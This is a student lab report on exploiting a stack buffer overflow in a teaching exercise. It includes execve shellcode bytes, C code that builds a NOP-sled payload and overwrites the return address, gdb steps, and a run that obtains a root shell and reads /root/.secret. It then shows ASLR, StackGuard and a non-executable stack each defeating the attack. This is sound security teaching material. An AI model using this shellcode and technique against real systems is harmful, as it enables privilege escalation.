# Rapport TP `bufoverflow`

## Task 1: Exploiting the Vulnerability
To exploit the buffer overflow vulnerability, 2 main things should be done:
- Adding the shellcode at the end of the buffer (in the overflowed buffer).
- Overwriting the return address with a pointer to the shellcode.

### Provided code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

unsigned long get_sp(void) {
   __asm__("movl %esp, %eax");
}

void main(int argc, char *argv[]) {
    char buffer[1000];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 1000);

    /* You need to fill the buffer with appropriate contents here */

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 1000, 1, badfile);
    fclose(badfile);
}
```
The provided code is a simple C program that initializes a buffer with 1000 `NOP` instructions, then writes the buffer to a file named `badfile`.

### Adding the shellcode
To this code, we will first add the following:
```c
int shell_offset = sizeof(buffer) - sizeof(shellcode);
for (int i = 0; i < sizeof(shellcode); i++) {
    buffer[shell_offset + i] = shellcode[i];
}
```
This code will add the shellcode to the end of the buffer, thus making sure that the shellcode is in the overflowed section of the buffer.

### Overwriting the return address
To overwrite the return address, we first need to find the address of the buffer in memory. We can do this by debugging the program and printing the address of the buffer. We can then use this address to calculate the return address we want.

```
$> gdb -q stack
(gdb) disas bof
(gdb) break *0x080484ca
(gdb) r
(gdb) i r $ebp
```
_Results in the image `gdb.png`_

Here's an explanation of the commands:
- `disas bof`: Disassemble the `bof` function to find the address of the buffer.
- `break *0x080484ca`: Set a breakpoint at the end of the `bof` function.
- `r`: Run the program.
- `i r $ebp`: Print the value of the `ebp` register, which points to the base of the stack frame.

Once we have this address (`0xffffd2a8`) we can simply add an offset to it to ensure falling into the "NOP sled" which will lead to the shellcode.
For the offset I simply chose to change the 2 to a 3 in the address. Hence the return address will be `0xffffd3a8`.

To add this to the code, we do the following:
```c
#define BUFFER_SIZE 293
...
int main(int argc, char *argv[]) {
    ...
    for (int i = BUFFER_SIZE%4; i <= BUFFER_SIZE + 16; i++) {
        *(buffer + i) = 0xa8;
        *(buffer + i + 1) = 0xd3;
        *(buffer + i + 2) = 0xff;
        *(buffer + i + 3) = 0xff;
    }
    ...
}
```

### Running the exploit
```
$> gcc -o exploit exploit.c
$> ./exploit
$> ./stack
# cat /root/.secret
# This secret file is generated when container is created
# The root secret string below will be replaced with a keyed hash
My ROOT secret string is: 85bdbafcdbace591a72f87e42f641fd2

# id
uid=1000(ubuntu) gid=1000(ubuntu) euid=0(root) groups=1000(ubuntu),27(sudo)
```

## Task 2: Address Randomization
We enable the address randomization, then run the `whilebash.sh` script to run the exploit multiple times.

We can see that the exploit fails (`while.png`) to work when the address randomization is enabled. This is because the address of the buffer is randomized each time the program is run, making it almost impossible to find the shellcode with our fixed return address. The only scenario where the exploit would work is if we are lucky enough to have the buffer address fall into the NOP sled. Running the exploit multiple times, we do what we "squash" the address space to make the exploit work. However, nowadays, this space is too large to be able to do this. Hence, the exploit is not reliable.

## Task 3: Stack Guard
We disable the address randomization again and enable the stack guard. We then run the exploit and see that it fails to work (`squash.png`). This is because the stack guard detects the buffer overflow and terminates the program before the shellcode can be executed.

## Task 4: Non-Executable Stack
We disable the stack guard and enable the non-executable stack. We then run the exploit and see that it fails to work (`non-exec.png`). This is because the stack is marked as non-executable, so the shellcode cannot be executed from the stack.

## Conclusion
In conclusion, the buffer overflow exploit works when the address randomization is disabled, the stack guard is disabled, and the stack is executable. However, when any of these security features are enabled, the exploit fails to work. This shows the importance of these security features in preventing buffer overflow attacks.
